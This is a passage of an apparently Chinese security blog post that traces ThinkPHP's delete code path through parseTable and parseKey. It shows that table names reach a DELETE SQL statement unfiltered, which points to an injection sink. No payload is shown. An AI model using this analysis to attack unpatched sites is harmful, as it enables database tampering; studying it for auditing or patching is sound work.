punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">data</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$pk</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">data</span><span class="token punctuation">[</span><span class="token variable">$pk</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>              <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>     <span class="token punctuation">}</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">is_string</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token variable">$where</span><span class="token punctuation">[</span><span class="token variable">$pk</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'IN'</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>              <span class="token variable">$where</span><span class="token punctuation">[</span><span class="token variable">$pk</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$options</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token variable">$options</span>          <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$where</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$pk</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>         <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token function">array_keys</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_int</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                  <span class="token variable">$count</span><span class="token operator">++</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>         <span class="token punctuation">}</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$pk</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token variable">$count</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>             <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$pk</span> <span class="token keyword">as</span> <span class="token variable">$field</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                  <span class="token variable">$where</span><span class="token punctuation">[</span><span class="token variable">$field</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                 <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>             <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$where</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>              <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>     <span class="token punctuation">}</span>          <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">_parseOptions</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                   <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$pk</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token variable">$pkValue</span> <span class="token operator">=</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$pk</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">_before_delete</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">db</span><span class="token operator">-&gt;</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">!==</span> <span class="token variable">$result</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$pkValue</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$pk</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$pkValue</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">_after_delete</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>          <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在第二次调用<code>delete</code>方法时，调用了数据库驱动类中的<code>delete</code></p><p>路径：<code>ThinkPHP/Library/Think/Db/Driver.class.php</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token variable">$options</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token punctuation">{</span>          <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">model</span> <span class="token operator">=</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'model'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseBind</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bind'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bind'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseTable</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'table'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$sql</span>   <span class="token operator">=</span> <span class="token string single-quoted-string">'DELETE FROM '</span> <span class="token operator">.</span> <span class="token variable">$table</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'using'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                  <span class="token variable">$sql</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">' USING '</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseTable</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'using'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' '</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span>           <span class="token variable">$sql</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseJoin</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'join'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'join'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>       <span class="token variable">$sql</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseWhere</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'where'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                         <span class="token variable">$sql</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseOrder</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'order'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>           <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseLimit</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>       <span class="token variable">$sql</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseComment</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'comment'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'comment'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fetch_sql'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token argument-name">true</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关键代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$table</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseTable</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'table'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span>   <span class="token operator">=</span> <span class="token string single-quoted-string">'DELETE FROM '</span> <span class="token operator">.</span> <span class="token variable">$table</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fetch_sql'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token argument-name">true</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里<code>$table</code>经过<code>parseTable</code>函数后拼接到 sql 语句中，最后执行 sql 语句</p><p>跟进<code>parseTable</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">parseTable</span><span class="token punctuation">(</span><span class="token variable">$tables</span><span class="token punctuation">)</span>   <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$tables</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$tables</span> <span class="token keyword">as</span> <span class="token variable">$table</span> <span class="token operator">=&gt;</span> <span class="token variable">$alias</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                      <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseKey</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' '</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseKey</span><span class="token punctuation">(</span><span class="token variable">$alias</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                      <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseKey</span><span class="token punctuation">(</span><span class="token variable">$alias</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">}</span>           <span class="token punctuation">}</span>           <span class="token variable">$tables</span> <span class="token operator">=</span> <span class="token variable">$array</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$tables</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token variable">$tables</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token variable">$tables</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token function">array_walk</span><span class="token punctuation">(</span><span class="token variable">$tables</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'parseKey'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>       <span class="token keyword">return</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token variable">$tables</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中的数据经过<code>parseKey</code>处理，跟进</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">parseKey</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$key</span><span class="token punctuation">)</span>   <span class="token punctuation">{</span>       <span class="token keyword">return</span> <span class="token variable">$key</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>直接返回，无任何过滤, 那么最后返回结果执行<code>execute</code>方法</p><p>跟进，该函数开头有初始化连接操作</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">initConnect</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>跟进</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">initConnect</span><span class="token punctuation">(</span><span class="token variable">$master</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span>   <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'deploy'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              <span class="token punctuation">{</span>              <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_linkID</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">multiConnect</span><span class="token punctuation">(</span><span class="token variable">$master</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span> <span class="token keyword">else</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_linkID</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_linkID</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再跟进<code>connect</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token variable">$config</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$linkNum</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$autoConnection</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span>   <span class="token punctuation">{</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">linkID</span><span class="token punctuation">[</span><span class="token variable">$linkNum</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>               <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">config</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span>           <span class="token keyword">try</span> <span class="token punctuation">{</span>               <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dsn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                   <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dsn'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseDsn</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">}</span>               <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">version_compare</span><span class="token punctuation">(</span><span class="token constant">PHP_VERSION</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'5.3.6'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;='</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">options</span><span class="token punctuation">[</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">ATTR_EMULATE_PREPARES</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>               <span class="token punctuation">}</span>               <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">linkID</span><span class="token punctuation">[</span><span class="token variable">$linkNum</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dsn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$autoConnection</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                      <span class="token function">trace</span><span class="token punctuation">(</span><span class="token variable">$e</span><span class="token operator">-&gt;</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ERR'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token variable">$autoConnection</span><span class="token punctuation">,</span> <span class="token variable">$linkNum</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'debug'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                      <span class="token function">E</span><span class="token punctuation">(</span><span class="token variable">$e</span><span class="token operator">-&gt;</span><span class="token function">getMessage</span><span class="token 